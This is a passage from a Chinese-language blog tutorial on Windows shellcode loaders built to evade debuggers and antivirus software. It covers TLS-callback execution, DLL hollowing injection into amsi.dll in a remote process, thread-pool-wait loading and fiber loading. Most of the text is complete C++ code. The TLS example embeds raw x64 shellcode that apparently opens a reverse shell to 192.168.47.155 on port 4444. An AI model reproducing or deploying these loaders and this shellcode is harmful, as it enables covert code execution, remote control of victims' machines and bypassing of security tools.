class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION; <span class="comment">// 在处理完异常后，程序继续执行异常发生位置的代码</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	EXCEPTION_CONTINUE_EXECUTION返回值会导致程序在处理完异常后重新执行引发异常的那一行代码。</span></span><br><span class="line"><span class="comment">	由于ExceptFilter函数已经修改了变量b的值（将其设置为1），再次执行a / b时将不会触发异常。</span></span><br><span class="line"><span class="comment">	因此，这个程序不会反复加载shellcode</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	异常处理函数的返回值除了有EXCEPTION_CONTINUE_EXECUTION,还有以下两个值:</span></span><br><span class="line"><span class="comment">	EXCEPTION_EXECUTE_HANDLER:异常处理器已处理异常，程序应在_except块内继续执行</span></span><br><span class="line"><span class="comment">	EXCEPTION_CONTINUE_SEARCH:异常处理器未处理异常，程序应继续搜索其他异常处理器</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_try <span class="comment">// 尝试执行可能引发异常的代码块</span></span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="type">int</span> c = a / b; <span class="comment">// 故意执行除零操作以触发异常</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	_except(<span class="built_in">ExceptFilter</span>()) &#123; <span class="comment">// 当异常发生时，调用ExceptFilter函数处理</span></span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="10-基于TLS机制"><a href="#10-基于TLS机制" class="headerlink" title="10.基于TLS机制"></a>10.基于TLS机制</h1><h2 id="什么是TLS"><a href="#什么是TLS" class="headerlink" title="什么是TLS"></a>什么是TLS</h2><p>线程局部存储（Thread Local Storage，TLS）是一种将数据与特定执行线程关联的机制。当在一个线程内部的各个函数调用之间共享数据，但不让其他线程访问时，可以使用TLS</p>
<h2 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h2><p>TLS提供了一个回调函数，在线程初始化和终止时会被调用，这个回调函数会在程序入口点(即main函数)之前执行，调试器通常会在主函数入口点设置断点，因此TLS回调函数经常被用作反调试手段</p>
<p>TLS回调函数允许我们编写并执行任意代码。TLS有两种类型：静态TLS和动态TLS。静态TLS将TLS相关数据硬编码在PE（Portable Executable）文件中，而动态TLS在运行时分配和管理TLS数据。</p>
<p>静态TLS是将TLS相关数据硬编码在PE（Portable Executable，可执行文件）中。静态TLS存储在PE头的<code>IMAGE_DATA_DIRECTORY DataDirectory[9]</code>位置，可以通过该位置找到TLS目录的详细信息</p>
<p>通过在TLS回调函数中加载和执行shellcode，我们可以在程序的正常执行流之前运行这段代码。这种方法可以绕过调试器设置的断点，增加分析和调试的难度</p>
<p>TLS回调函数遵循特殊的编写约定，与DLL主函数类似。回调函数使用以下类型定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span></span></span><br><span class="line"><span class="function"><span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID DllHandle, <span class="comment">//DLL模块的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function"> DWORD Reason, <span class="comment">//调用原因。这个参数与DLL调用时的原因相同，例如：DLL_PROCESS_ATTACH（当进程加载DLL时）、DLL_THREAD_ATTACH（当线程创建时）等</span></span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID Reserved  <span class="comment">//保留参数，通常用于区分DLL是显式加载还是隐式加载</span></span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="实现代码-3"><a href="#实现代码-3" class="headerlink" title="实现代码"></a>实现代码</h2><p>这段代码的核心目的是在程序启动时，通过TLS回调函数来执行Shellcode，而不是在主函数中执行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用于存放shellcode的数组</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//TLS回调函数</span></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TlsCallBack</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;	</span><br><span class="line">		HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(buffer, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">		((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//确保链接器在生成可执行文件时包含TLS相关的符号,即确保链接器知道程序使用了TLS功能和自定义的TLS回调函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码告诉编译器，接下来的数据（如变量定义）将放置在名为.CRT$XLB的数据段中。</span></span><br><span class="line"><span class="comment">//.CRT$XLB是一个特殊的数据段名称，链接器将在其中寻找TLS回调函数的地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码定义了一个名为_tls_callback的变量，其类型为PIMAGE_TLS_CALLBACK（一个指向TLS回调函数的指针）。</span></span><br><span class="line"><span class="comment">//此变量被初始化为指向TlsCallBack函数的地址</span></span><br><span class="line"><span class="comment">//由于我们在第一行代码中使用了#pragma data_seg指令，_tls_callback变量将被放置在.CRT$XLB数据段中</span></span><br><span class="line"><span class="comment">//.CRT$XLB是一个特定的数据段名称，与C运行时（C Runtime，CRT）机制有关。在这个名称中，各部分的含义如下：</span></span><br><span class="line"><span class="comment">//.CRT：这个前缀表示该数据段与C运行时机制相关。</span></span><br><span class="line"><span class="comment">//$：这个符号在数据段名称中用作分隔符。</span></span><br><span class="line"><span class="comment">//XL：这两个字符表示该数据段用于存储TLS回调函数地址。在链接器处理TLS回调时，它会查找具有这个前缀的数据段。</span></span><br><span class="line"><span class="comment">//B：这个字母表示数据段的顺序。这个字符可以是字母表中的B到Y之间的任意一个字母。这意味着可以定义多个TLS回调，链接器会按照字母顺序调用它们。</span></span><br><span class="line"><span class="comment">//需要注意的是，.CRT$XLA和.CRT$XLZ这两个数据段名称是保留的，用于C运行时库的内部实现，因此不应在用户代码中使用</span></span><br><span class="line"><span class="comment">//EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span></span><br><span class="line">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码告诉编译器恢复默认的数据段。</span></span><br><span class="line"><span class="comment">//这意味着在这个指令之后定义的数据（如变量定义）将被放置在默认的数据段中，而不是.CRT$XLB数据段</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg ()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tls回调函数执行完后才执行我!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="11-dll镂空注入"><a href="#11-dll镂空注入" class="headerlink" title="11.dll镂空注入"></a>11.dll镂空注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>模块镂空（DLL Hollowing）是一种Shellcode注入技术，它借鉴了进程镂空（Process Hollowing）的原理和思路。通过利用合法模块信息来伪装恶意代码，使得检测变得困难。虽然可以通过远程DLL注入的方式将整个恶意DLL注入目标系统，但这种方法较易被检测。例如，攻击者需要将恶意DLL上传到受害者主机，而杀毒软件可以通过监控Windows&#x2F;Temp&#x2F;等目录来拦截远程DLL注入。</p>
<p>相比之下，模块镂空不具备这样的风险，因为它是在带有微软签名的DLL中镂空一个区域。为了避免进程出错，不能直接在进程空间中已存在的DLL上进行镂空。取而代之的方法是先向目标进程远程注入一个合法的系统DLL，然后再镂空它。这样一来，我们就获得了一个与Windows模块相关联的Shellcode执行环境，既能规避安全检测，又能实现恶意代码执行</p>
<h2 id="代码实现思路"><a href="#代码实现思路" class="headerlink" title="代码实现思路"></a>代码实现思路</h2><ol>
<li><strong>确定要注入的目标进程：</strong>根据进程ID打开目标进程，获取其句柄（示例代码中的进程ID固定为2924，实际应用中可能需要根据需求进行调整）。</li>
<li><strong>将合法的DLL（如amsi.dll）注入目标进程：</strong>通过<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>将DLL名称写入远程进程的内存空间。然后，获取<code>LoadLibraryW</code>函数的地址，并在远程进程中创建一个新线程以调用该函数，实现DLL的加载。</li>
<li><strong>确定注入的DLL在目标进程中的基址：</strong>使用<code>EnumProcessModules</code>函数遍历目标进程中加载的所有模块，找到已注入的合法DLL（如amsi.dll）的基址。</li>
<li><strong>获取DLL的入口点：</strong>读取注入的DLL的PE头部信息，包括DOS头部和NT头部，从中获取DLL的入口点（AddressOfEntryPoint），并计算在目标进程中的实际地址。</li>
<li><strong>向DLL的入口点写入Shellcode：</strong>使用<code>WriteProcessMemory</code>将Shellcode写入目标进程的DLL入口点。</li>
<li><strong>执行Shellcode：</strong>在目标进程中创建一个新线程，以DLL的入口点作为线程的起始地址，从而在镂空的DLL内部执行Shellcode</li>
</ol>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将你的Shellcode放在这里</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR ModuleName[] = <span class="string">L&quot;C:\\windows\\system32\\amsi.dll&quot;</span>; <span class="comment">//定义要注入的合法DLL的文件路径</span></span><br><span class="line">    HMODULE hModules[<span class="number">256</span>] = &#123;&#125;;  <span class="comment">//定义一个数组用于存储目标进程中加载的模块的句柄</span></span><br><span class="line">    SIZE_T hModulesSize = <span class="built_in">sizeof</span>(hModules); <span class="comment">//计算存储模块句柄数组的大小</span></span><br><span class="line">    DWORD hModulesSizeNeeded = <span class="number">0</span>;  <span class="comment">//用于存储EnumProcessModules函数返回的实际需要的缓冲区大小</span></span><br><span class="line"></span><br><span class="line">    DWORD moduleNameSize = <span class="number">0</span>;  <span class="comment">//定义变量用于存储模块名称的大小（未使用）</span></span><br><span class="line">    SIZE_T hModulesCount = <span class="number">0</span>;  <span class="comment">//计算目标进程中模块的数量</span></span><br><span class="line">    CHAR rModuleName[<span class="number">128</span>] = &#123;&#125;;  <span class="comment">//定义一个字符数组用于存储远程模块的名称</span></span><br><span class="line">    HMODULE rModule = <span class="literal">NULL</span>;  <span class="comment">//定义一个变量用于存储找到的远程模块的句柄</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 以可读写权限打开目标进程</span></span><br><span class="line">    <span class="comment">//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="number">31652</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在远程进程中分配内存并写入待注入DLL的路径</span></span><br><span class="line">    LPVOID lprBuffer = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> ModuleName, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lprBuffer, (LPVOID)ModuleName, <span class="keyword">sizeof</span> ModuleName, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取LoadLibraryW函数的地址，用于在远程进程中加载DLL</span></span><br><span class="line">    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建远程线程以加载DLL</span></span><br><span class="line">    HANDLE dllThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, threadRoutine, lprBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待远程线程加载完DLL</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(dllThread, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到在远程进程中注入的DLL的基地址</span></span><br><span class="line">    <span class="built_in">EnumProcessModules</span>(hProcess, hModules, hModulesSize, &amp;hModulesSizeNeeded);</span><br><span class="line">    hModulesCount = hModulesSizeNeeded / <span class="built_in">sizeof</span>(HMODULE);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hModulesCount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rModule = hModules[i];</span><br><span class="line">        <span class="built_in">GetModuleBaseNameA</span>(hProcess, rModule, rModuleName, <span class="built_in">sizeof</span>(rModuleName));</span><br><span class="line">        <span class="keyword">if</span> (std::<span class="built_in">string</span>(rModuleName).<span class="built_in">compare</span>(<span class="string">&quot;amsi.dll&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取DLL的AddressOfEntryPoint</span></span><br><span class="line">    DWORD headerBufferSize = <span class="number">0x1000</span>;</span><br><span class="line">    LPVOID peHeader = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, headerBufferSize);</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(hProcess, rModule, peHeader, headerBufferSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader + dosHeader-&gt;e_lfanew);</span><br><span class="line">    LPVOID dllEntryPoint = (LPVOID)(ntHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)rModule);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Shellcode写入DLL的AddressOfEntryPoint</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, dllEntryPoint, (LPCVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从注入的DLL中执行Shellcode</span></span><br><span class="line">    <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (PTHREAD_START_ROUTINE)dllEntryPoint, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="12-线程池等待"><a href="#12-线程池等待" class="headerlink" title="12.线程池等待"></a>12.线程池等待</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;填写shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ThreadPoolLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个DWORD变量，用于存储原始内存保护属性</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改shellcode所在内存的保护属性为可读、可写、可执行</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个事件对象，初始状态为有信号状态，使用默认安全属性，非手动重置，无名称</span></span><br><span class="line">    HANDLE event = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    CreateThreadpoolWait用于创建一个线程池等待对象的函数,</span></span><br><span class="line"><span class="comment">    程池等待对象允许您在等待内核对象（如事件、信号量等）变为有信号状态时执行特定的回调函数</span></span><br><span class="line"><span class="comment">    其语法格式如下:</span></span><br><span class="line"><span class="comment">    PTP_WAIT CreateThreadpoolWait(</span></span><br><span class="line"><span class="comment">      PTP_WAIT_CALLBACK pfnwa,  //指向回调函数的指针</span></span><br><span class="line"><span class="comment">      PVOID              pv,   //传递给回调函数的参数</span></span><br><span class="line"><span class="comment">      PTP_CALLBACK_ENVIRON pcbe  //指向线程池回调环境的指针,置NULL则表示使用默认的环境</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 创建一个线程池等待对象，关联到shellcode作为回调函数，回调函数参数和线程池环境为NULL</span></span><br><span class="line">    PTP_WAIT threadPoolWait = <span class="built_in">CreateThreadpoolWait</span>((PTP_WAIT_CALLBACK)(LPVOID)shellcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    SetThreadpoolWait函数用于线程池中添加等待对象的函数。</span></span><br><span class="line"><span class="comment">    当等待的内核对象（如事件、信号量等）变为有信号状态时，线程池会调用与等待对象关联的回调函数</span></span><br><span class="line"><span class="comment">    其语法格式如下:</span></span><br><span class="line"><span class="comment">    VOID SetThreadpoolWait(</span></span><br><span class="line"><span class="comment">      PTP_WAIT pwa,  //指向要添加到线程池的等待对象的指针</span></span><br><span class="line"><span class="comment">      HANDLE   hObject,  //要等待的内核对象的句柄,当这个内核对象变为有信号状态时,线程池会调用与等待对象关联的回调函数</span></span><br><span class="line"><span class="comment">      PFILETIME pftTimeout  //指向一个FILETIME结构的指针，表示等待超时的时间</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 将等待对象添加到线程池中,当事件对象event触发（变为有信号状态）时，线程池会调用与threadPoolWait关联的回调函数</span></span><br><span class="line">    <span class="built_in">SetThreadpoolWait</span>(threadPoolWait, event, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待事件对象变为无信号状态（表示shellcode执行完毕），无限等待</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(event, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ThreadPoolLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="13-创建纤程加载"><a href="#13-创建纤程加载" class="headerlink" title="13.创建纤程加载"></a>13.创建纤程加载</h1><h2 id="什么是纤程"><a href="#什么是纤程" class="headerlink" title="什么是纤程"></a>什么是纤程</h2><p>纤程（Fiber）是一种轻量级的线程，也被称为协程（Coroutine）或微线程（Microthread）。它们是一种用户级别的线程，由程序自身管理，而不是由操作系统内核管理。纤程是一种可以提高程序执行效率的调度机制，特别适用于需要大量并发执行任务的场景</p>
<h2 id="实现代码-4"><a href="#实现代码-4" class="headerlink" title="实现代码"></a>实现代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改shellcode所在内存的保护属性为可读、可写、可执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将当前线程转换为纤程（轻量级线程）</span></span><br><span class="line">    <span class="built_in">ConvertThreadToFiber</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span></span><br><span class="line">    <span class="type">void</span>* shellcodeFiber = <span class="built_in">CreateFiber</span>(<span class="number">0</span>, (LPFIBER_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切换到新创建的纤程，开始执行shellcode</span></span><br><span class="line">    <span class="built_in">SwitchToFiber</span>(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shellcode执行完毕后，删除纤程对象</span></span><br><span class="line">    <span class="built_in">DeleteFiber</span>(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



